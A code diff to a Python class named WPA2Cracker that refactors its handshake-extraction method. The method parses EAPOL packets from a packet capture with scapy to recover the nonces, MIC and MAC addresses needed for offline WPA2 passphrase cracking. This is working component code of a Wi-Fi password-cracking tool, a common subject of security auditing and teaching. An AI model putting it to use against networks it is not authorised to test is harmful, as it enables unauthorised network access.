@@ -22,12 +22,9 @@ class WPA2Cracker:
 
     def extract_handshake(self):
         """
-        STEP 1: Extract WPA2 4-way handshake from pcap
+        STEP 1: Extract WPA2 4-way handshake from .pcap or .cap
 
-        Purpose: Parse EAPOL packets to extract cryptographic nonces and MIC
-        Process:
-        - Message 1 (AP→Client): Extract ANonce + MAC addresses
-        - Message 2 (Client→AP): Extract SNonce + MIC for verification
+        Correctly identifies ANonce and SNonce from monitor-mode captures.
         """
         packets = scapy.rdpcap(self.pcap_file)
         eapol_packets = [
@@ -35,43 +32,43 @@ class WPA2Cracker:
         ]
 
         if len(eapol_packets) < 2:
-            print("Insufficient EAPOL packets for handshake")
+            print("❌ Insufficient EAPOL packets for handshake")
             return None
 
         eapol_packets.sort(key=lambda x: x.time)
         anonce = snonce = ap_mac = client_mac = mic = mic_data = None
 
-        for i, pkt in enumerate(eapol_packets):
+        for pkt in eapol_packets:
             eapol_raw = bytes(pkt[scapy.EAPOL])
             if len(eapol_raw) < 97:
                 continue
 
-            # Parse EAPOL key packet structure (IEEE 802.11-2016)
             key_info = struct.unpack(">H", eapol_raw[5:7])[0]
-            key_nonce = eapol_raw[17:49]  # Nonce field (32 bytes)
-            key_mic = eapol_raw[81:97]  # MIC field (16 bytes)
+            key_nonce = eapol_raw[17:49]
+            key_mic = eapol_raw[81:97]
 
-            # Extract message type flags
-            ack = bool(key_info & 0x0080)  # Acknowledge bit
-            mic_flag = bool(key_info & 0x0100)  # MIC bit
-            pairwise = bool(key_info & 0x0008)  # Pairwise bit
+            ack = bool(key_info & 0x0080)
+            mic_flag = bool(key_info & 0x0100)
+            pairwise = bool(key_info & 0x0008)
+
+            dot11 = pkt[scapy.Dot11]
+
+            def mac_clean(mac): return mac.replace(":", "").lower() if mac else None
 
             if pairwise and ack and not mic_flag and not anonce:
-                # Message 1: AP sends ANonce to client
+                # Message 1 (ANonce): AP → STA
                 anonce = key_nonce
-                dot11 = pkt[scapy.Dot11]
-                ap_mac = dot11.addr2.replace(":", "").lower()
-                client_mac = dot11.addr1.replace(":", "").lower()
+                ap_mac = mac_clean(dot11.addr2)
+                client_mac = mac_clean(dot11.addr1)
 
             elif pairwise and mic_flag and not ack and not snonce:
-                # Message 2: Client sends SNonce + MIC to AP
+                # Message 2 (SNonce + MIC): STA → AP
                 snonce = key_nonce
                 mic = key_mic
-                # Prepare MIC verification data (original packet with MIC zeroed)
                 mic_data = eapol_raw[:81] + b"\x00" * 16 + eapol_raw[97:]
 
         if not all([anonce, snonce, ap_mac, client_mac, mic, mic_data]):
-            print("Failed to extract complete handshake")
+            print("❌ Failed to extract full handshake")
             return None
 
         self.handshake_data = {
@@ -83,7 +80,7 @@ class WPA2Cracker:
             "mic_data": mic_data,
         }
 
-        print(f"✓ Handshake extracted: AP={ap_mac[:6]}..., Client={client_mac[:6]}...")
+        print(f"✓ Handshake extracted: AP={ap_mac}, Client={client_mac}")
         return self.handshake_data
 
     def derive_ptk(self, passphrase):
